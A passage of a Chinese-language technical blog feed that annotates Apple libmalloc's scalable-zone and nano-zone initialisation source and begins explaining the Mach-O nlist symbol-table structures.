class="line"></span><br><span class="line">	szone-&gt;basic_zone.version = <span class="number">8</span>;</span><br><span class="line">	szone-&gt;basic_zone.size = (<span class="keyword">void</span> *)szone_size;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">malloc</span> = (<span class="keyword">void</span> *)szone_malloc;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">calloc</span> = (<span class="keyword">void</span> *)szone_calloc;</span><br><span class="line">	szone-&gt;basic_zone.valloc = (<span class="keyword">void</span> *)szone_valloc;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">free</span> = (<span class="keyword">void</span> *)szone_free;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">realloc</span> = (<span class="keyword">void</span> *)szone_realloc;</span><br><span class="line">	szone-&gt;basic_zone.destroy = (<span class="keyword">void</span> *)szone_destroy;</span><br><span class="line">	szone-&gt;basic_zone.batch_malloc = (<span class="keyword">void</span> *)szone_batch_malloc;</span><br><span class="line">	szone-&gt;basic_zone.batch_free = (<span class="keyword">void</span> *)szone_batch_free;</span><br><span class="line">	szone-&gt;basic_zone.introspect = (<span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span> *)&amp;szone_introspect;</span><br><span class="line">	szone-&gt;basic_zone.memalign = (<span class="keyword">void</span> *)szone_memalign;</span><br><span class="line">	szone-&gt;basic_zone.free_definite_size = (<span class="keyword">void</span> *)szone_free_definite_size;</span><br><span class="line">	szone-&gt;basic_zone.pressure_relief = (<span class="keyword">void</span> *)szone_pressure_relief;</span><br><span class="line"></span><br><span class="line">	szone-&gt;basic_zone.reserved1 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	szone-&gt;basic_zone.reserved2 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	mprotect(szone, <span class="keyword">sizeof</span>(szone-&gt;basic_zone), PROT_READ); <span class="comment">/* Prevent overwriting the function pointers in basic_zone. */</span></span><br><span class="line"></span><br><span class="line">	szone-&gt;debug_flags = debug_flags;</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;large_szone_lock);</span><br><span class="line">	<span class="comment">// ---------初始化外部调用函数---------------------------------end-------------</span></span><br><span class="line">	</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__ppc__) || defined(__ppc64__)</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * In the interest of compatibility for PPC applications executing via Rosetta,</span><br><span class="line">	 * arrange to zero-fill allocations as occurred by side effect in Leopard and earlier.</span><br><span class="line">	 */</span></span><br><span class="line">	zeroify_scalable_zone((<span class="keyword">malloc_zone_t</span> *)szone);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	szone-&gt;cpu_id_key = -<span class="number">1U</span>L; <span class="comment">// Unused.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Query the number of configured processors.</span></span><br><span class="line">	<span class="comment">// Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives</span></span><br><span class="line">	<span class="comment">// the same behavior as the original scalable malloc. MP gets per-CPU magazines</span></span><br><span class="line">	<span class="comment">// that scale (way) better.</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__) || defined(__arm__) || defined(__arm64__)</span></span><br><span class="line">	<span class="keyword">int</span> nproc = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_NCPUS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">int</span> nproc = sysconf(_SC_NPROCESSORS_CONF);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个tiny的内存空间，并初始化相关数据--------start</span></span><br><span class="line">	<span class="comment">//根据cpu的根数，计算获得需要多少个tiny的内存空间</span></span><br><span class="line">	szone-&gt;num_tiny_magazines = (nproc &gt; <span class="number">1</span>) ? MIN(nproc, TINY_MAX_MAGAZINES) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIXME vm_allocate() based on number of configured CPUs</span></span><br><span class="line">	<span class="comment">//申请需要的内存空间</span></span><br><span class="line">	<span class="keyword">magazine_t</span> *tiny_magazines = allocate_pages(<span class="literal">NULL</span>, TINY_MAGAZINE_PAGED_SIZE, <span class="number">0</span>,</span><br><span class="line">												SCALABLE_MALLOC_ADD_GUARD_PAGES, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == tiny_magazines)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//将申请的内存空间赋值到szone中相关的字段上</span></span><br><span class="line">	szone-&gt;tiny_magazines = &amp;(tiny_magazines[<span class="number">1</span>]); <span class="comment">// szone-&gt;tiny_magazines[-1] is the Depot</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The magazines are indexed in [0 .. (num_tiny_magazines - 1)]</span></span><br><span class="line">	<span class="comment">// Find the smallest power of 2 that exceeds (num_tiny_magazines - 1)</span></span><br><span class="line">	<span class="comment">// 通过计算获取num_tiny_magazines_mask_shift的值</span></span><br><span class="line">	<span class="comment">// num_tiny_magazines_mask_shift = log2(szone-&gt;num_tiny_magazines-1)</span></span><br><span class="line">	szone-&gt;num_tiny_magazines_mask_shift = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>( i &lt;= (szone-&gt;num_tiny_magazines - <span class="number">1</span>) ) &#123;</span><br><span class="line">		szone-&gt;num_tiny_magazines_mask_shift++;</span><br><span class="line">		i &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now if i &lt;= TINY_MAX_MAGAZINES we'll never access tiny_magazines[] out of bounds.</span></span><br><span class="line">	<span class="keyword">if</span> (i &gt; TINY_MAX_MAGAZINES) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - magazine mask exceeds allocated magazines.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reduce i by 1 to obtain a mask covering [0 .. (num_tiny_magazines - 1)]</span></span><br><span class="line">	szone-&gt;num_tiny_magazines_mask = i - <span class="number">1</span>; <span class="comment">// A mask used for hashing to a magazine index (and a safety aid)</span></span><br><span class="line">	szone-&gt;last_tiny_advise = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Init the tiny_magazine locks</span></span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;tiny_regions_lock);</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;tiny_magazines[DEPOT_MAGAZINE_INDEX].magazine_lock);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; szone-&gt;num_tiny_magazines; ++i) &#123;</span><br><span class="line">		_malloc_lock_init(&amp;szone-&gt;tiny_magazines[i].magazine_lock);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个tiny的内存空间，并初始化相关数据--------end</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个small的内存空间，并初始化相关数据--------start</span></span><br><span class="line">	szone-&gt;num_small_magazines = (nproc &gt; <span class="number">1</span>) ? MIN(nproc, SMALL_MAX_MAGAZINES) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIXME vm_allocate() based on number of configured CPUs</span></span><br><span class="line">	<span class="keyword">magazine_t</span> *small_magazines = allocate_pages(<span class="literal">NULL</span>, SMALL_MAGAZINE_PAGED_SIZE, <span class="number">0</span>,</span><br><span class="line">												 SCALABLE_MALLOC_ADD_GUARD_PAGES, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == small_magazines)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	szone-&gt;small_magazines = &amp;(small_magazines[<span class="number">1</span>]); <span class="comment">// szone-&gt;small_magazines[-1] is the Depot</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The magazines are indexed in [0 .. (num_small_magazines - 1)]</span></span><br><span class="line">	<span class="comment">// Find the smallest power of 2 that exceeds (num_small_magazines - 1)</span></span><br><span class="line">	szone-&gt;num_small_magazines_mask_shift = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>( i &lt;= (szone-&gt;num_small_magazines - <span class="number">1</span>) ) &#123;</span><br><span class="line">		szone-&gt;num_small_magazines_mask_shift++;</span><br><span class="line">		i &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now if i &lt;= SMALL_MAX_MAGAZINES we'll never access small_magazines[] out of bounds.</span></span><br><span class="line">	<span class="keyword">if</span> (i &gt; SMALL_MAX_MAGAZINES) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - magazine mask exceeds allocated magazines.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reduce i by 1 to obtain a mask covering [0 .. (num_small_magazines - 1)]</span></span><br><span class="line">	szone-&gt;num_small_magazines_mask = i - <span class="number">1</span>; <span class="comment">// A mask used for hashing to a magazine index (and a safety aid)</span></span><br><span class="line">	szone-&gt;last_small_advise = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Init the small_magazine locks</span></span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;small_regions_lock);</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;small_magazines[DEPOT_MAGAZINE_INDEX].magazine_lock);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; szone-&gt;num_small_magazines; ++i) &#123;</span><br><span class="line">		_malloc_lock_init(&amp;szone-&gt;small_magazines[i].magazine_lock);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CHECK(szone, __PRETTY_FUNCTION__);</span><br><span class="line">	<span class="comment">// ------为每个一个cpu都申请一个small的内存空间，并初始化相关数据--------end</span></span><br><span class="line">	<span class="comment">//逻辑与tiny相同，只是变量不同</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)szone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="create_nano_zone">create_nano_zone</h3><p>对<code>nano_zone</code>的创建就相对简单很多，这里不多做分析，直接看注释的源码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((visibility(<span class="string">"hidden"</span>)))</span><br><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">create_nano_zone(<span class="keyword">size_t</span> initial_size, <span class="keyword">malloc_zone_t</span> *helper_zone, <span class="keyword">unsigned</span> debug_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">nanozone_t</span>	*nanozone;</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!_malloc_engaged_nano) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//检测comm page的版本</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__x86_64__)</span></span><br><span class="line">	<span class="keyword">if</span> (_COMM_PAGE_VERSION_REQD &gt; (*((<span class="keyword">uint16_t</span> *)_COMM_PAGE_VERSION))) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - comm page version mismatch.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* get memory for the zone. */</span></span><br><span class="line">	<span class="comment">//申请nanozone数据结构大小的内存</span></span><br><span class="line">	nanozone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (!nanozone)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the basic_zone portion of the nanozone structure */</span></span><br><span class="line">	<span class="comment">//设置外部调用函数</span></span><br><span class="line">	nanozone-&gt;basic_zone.version = <span class="number">8</span>;</span><br><span class="line">	nanozone-&gt;basic_zone.size = (<span class="keyword">void</span> *)nano_size;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">malloc</span> = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ? (<span class="keyword">void</span> *)nano_malloc_scribble : (<span class="keyword">void</span> *)nano_malloc;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">calloc</span> = (<span class="keyword">void</span> *)nano_calloc;</span><br><span class="line">	nanozone-&gt;basic_zone.valloc = (<span class="keyword">void</span> *)nano_valloc;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">free</span> = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ? (<span class="keyword">void</span> *)nano_free_scribble : (<span class="keyword">void</span> *)nano_free;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">realloc</span> = (<span class="keyword">void</span> *)nano_realloc;</span><br><span class="line">	nanozone-&gt;basic_zone.destroy = (<span class="keyword">void</span> *)nano_destroy;</span><br><span class="line">	nanozone-&gt;basic_zone.batch_malloc = (<span class="keyword">void</span> *)nano_batch_malloc;</span><br><span class="line">	nanozone-&gt;basic_zone.batch_free = (<span class="keyword">void</span> *)nano_batch_free;</span><br><span class="line">	nanozone-&gt;basic_zone.introspect = (<span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span> *)&amp;nano_introspect;</span><br><span class="line">	nanozone-&gt;basic_zone.memalign = (<span class="keyword">void</span> *)nano_memalign;</span><br><span class="line">	nanozone-&gt;basic_zone.free_definite_size = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ?</span><br><span class="line">	(<span class="keyword">void</span> *)nano_free_definite_size_scribble : (<span class="keyword">void</span> *)nano_free_definite_size;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;basic_zone.pressure_relief = (<span class="keyword">void</span> *)nano_pressure_relief;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;basic_zone.reserved1 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	nanozone-&gt;basic_zone.reserved2 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	</span><br><span class="line">	mprotect(nanozone, <span class="keyword">sizeof</span>(nanozone-&gt;basic_zone), PROT_READ); <span class="comment">/* Prevent overwriting the function pointers in basic_zone. */</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* set up the remainder of the nanozone structure */</span></span><br><span class="line">	nanozone-&gt;debug_flags = debug_flags;</span><br><span class="line">	nanozone-&gt;our_signature = NANOZONE_SIGNATURE;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Query the number of configured processors. */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__x86_64__)</span></span><br><span class="line">	nanozone-&gt;phys_ncpus = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_PHYSICAL_CPUS;</span><br><span class="line">	nanozone-&gt;logical_ncpus = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_LOGICAL_CPUS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">error</span> Unknown architecture</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//根据cpu的不同，对meta_data进行初始化</span></span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;phys_ncpus &gt; <span class="keyword">sizeof</span>(nanozone-&gt;core_mapped_size)/<span class="keyword">sizeof</span>(nanozone-&gt;core_mapped_size[<span class="number">0</span>])) &#123;</span><br><span class="line">		_malloc_printf(ASL_LEVEL_NOTICE, <span class="string">"nano zone abandoned because NCPUS mismatch.\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != (nanozone-&gt;logical_ncpus % nanozone-&gt;phys_ncpus)) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - logical_ncpus % phys_ncpus != 0.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span> (nanozone-&gt;logical_ncpus/nanozone-&gt;phys_ncpus) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			malloc_printf(<span class="string">"*** FATAL ERROR - logical_ncpus / phys_ncpus not 1, 2, or 4.\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Initialize slot queue heads and resupply locks. */</span></span><br><span class="line">	<span class="comment">//#define	OS_ATOMIC_QUEUE_INIT	&#123; NULL, 0 &#125;</span></span><br><span class="line">	OSQueueHead q0 = OS_ATOMIC_QUEUE_INIT; <span class="comment">//&#123;NULL,0&#125;</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nanozone-&gt;phys_ncpus; ++i) &#123;</span><br><span class="line">        _malloc_lock_init(&amp;nanozone-&gt;band_resupply_lock[i]);</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; NANO_SLOT_SIZE; ++j) &#123;</span><br><span class="line">			nanozone-&gt;meta_data[i][j].slot_LIFO = q0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//对地址随机化做处理。</span></span><br><span class="line">	<span class="comment">/* Initialize the security token. */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == _dyld_get_image_slide((<span class="keyword">const</span> <span class="keyword">struct</span> mach_header*)_NSGetMachExecuteHeader())) &#123;</span><br><span class="line">		<span class="comment">// zero slide when ASLR has been disabled by boot-arg. Eliminate cloaking.</span></span><br><span class="line">		malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nanozone-&gt;cookie = (<span class="keyword">uintptr_t</span>)malloc_entropy[<span class="number">0</span>] &amp; <span class="number">0x0000ffffffff0000</span>ULL; <span class="comment">// scramble central 32bits with this cookie</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Nano zone does not support SCALABLE_MALLOC_ADD_GUARD_PAGES. */</span></span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;debug_flags &amp; SCALABLE_MALLOC_ADD_GUARD_PAGES) &#123;</span><br><span class="line">		_malloc_printf(ASL_LEVEL_INFO, <span class="string">"nano zone does not support guard pages\n"</span>);</span><br><span class="line">		nanozone-&gt;debug_flags &amp;= ~SCALABLE_MALLOC_ADD_GUARD_PAGES;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;helper_zone = helper_zone;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)nanozone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="小结">小结</h1><p>至此，<code>nano_zone</code>和<code>scalable_zone</code>的数据结构组成，以及其数据初始化之后的分布，已经大致的分析完成了，下一篇文章，将通过对<code>nano_malloc</code>以及<code>nano_free</code>的简单分析，来理解<code>nano_zone</code>的使用情况。</p>
<h1 id="reference">reference</h1><p>1.iOS内存管理和malloc源码解读</p>
<p><a href="https://yq.aliyun.com/articles/3065" target="_blank" rel="external">https://yq.aliyun.com/articles/3065</a></p>
<p>2.OS X heap exploitation techniques</p>
<p><a href="http://phrack.org/issues/63/5.html#article" target="_blank" rel="external">http://phrack.org/issues/63/5.html#article</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="摘要">摘要</h1><p>为了加深对<code>OS X</code>系统在应用层堆内存分配的了解，对<code>libmalloc</code>进行了阅读与理解。</p>
<ul>
<li>加强对堆上内存分布的理解</li>
<li>遇到内存泄露问题需要处理时，对堆分配策略的了解，可以提高分析的速度与精确度</li>
<li>遇到堆内存漏洞利用时，可以更加清楚的理解<code>EXP</code>的原理，做出更精准的分析</li>
</ul>
<p>阅读本文之前可以先稍微了解一下<code>OS X</code>在堆上的内存处理的大致情况，点<a href="https://yq.aliyun.com/articles/3065">这里</a>。了解大致情况之后，才能更好的理解源码的设计。</p>]]>
    
    </summary>
    
      <category term="malloc" scheme="http://turingh.github.io/tags/malloc/"/>
    
      <category term="基本功要扎实" scheme="http://turingh.github.io/tags/%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%A6%81%E6%89%8E%E5%AE%9E/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[nlist-Mach-O文件重定向信息数据结构分析]]></title>
    <link href="http://turingh.github.io/2016/05/24/nlist-Mach-O%E6%96%87%E4%BB%B6%E9%87%8D%E5%AE%9A%E5%90%91%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/05/24/nlist-Mach-O文件重定向信息数据结构分析/</id>
    <published>2016-05-25T03:30:50.000Z</published>
    <updated>2016-05-25T03:59:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在研究<code>Mach-O</code>的重定向相关内容时，就一定会遇到nlist这个数据结构，他定义在<mach-o nlist.h="">文件中，简单的对头文件中的注释做了翻译和整理，体现在图上面，nlist的数据结构看似非常简单，使用的时候却有点复杂，理解nlist的数据结构是进一步对OSX内核进行分析非常重要的一步。</mach-o></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/nlist/nlist%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.png" alt="nlist分析图"></p>
<a id="more"></a>
<h1 id="0x01_简单介绍">0x01 简单介绍</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> nlist &#123;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span> __LP64__</span></span><br><span class="line">		<span class="keyword">char</span> *n_name;	<span class="comment">/* for use when in-core */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">uint32_t</span> n_strx;	<span class="comment">/* index into the string table */</span></span><br><span class="line">	&#125; n_un;</span><br><span class="line">	<span class="keyword">uint8_t</span> n_type;		<span class="comment">/* type flag, see below */</span></span><br><span class="line">	<span class="keyword">uint8_t</span> n_sect;		<span class="comment">/* section number or NO_SECT */</span></span><br><span class="line">	<span class="keyword">int16_t</span> n_desc;		<span class="comment">/* see &lt;mach-o/stab.h&gt; */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> n_value;	<span class="comment">/* value of this symbol (or stab offset) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * This is the symbol table entry structure for 64-bit architectures.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> nlist_64 &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span>  n_strx; <span class="comment">/* index into the string table */</span></span><br><span class="line">    &#125; n_un;</span><br><span class="line">    <span class="keyword">uint8_t</span> n_type;        <span class="comment">/* type flag, see below */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> n_sect;        <span class="comment">/* section number or NO_SECT */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> n_desc;       <span class="comment">/* see &lt;mach-o/stab.h&gt; */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> n_value;      <span class="comment">/* value of this symbol (or stab offset) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-1_n_type">1.1 n_type</h2><p>​    <code>n_type</code>拥有8个bit，他的分配如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * The n_type field really contains four fields:</span><br><span class="line"> *	unsigned char N_STAB:3,</span><br><span class="line"> *		      N_PEXT:1,</span><br><span class="line"> *		      N_TYPE:3,</span><br><span class="line"> *		      N_EXT:1;</span><br><span class="line"> * which are used via the following masks.</span><br><span class="line"> */</span></span><br></pre></td></tr></table></figure>
<p>而<code>N_TYPE</code>又分出好多种，具体的定义可以参见上面的思维导图，或者源码中的注释。</p>
<p><code>n_type</code>字段主要用来标识重定义符号不同的种类。</p>
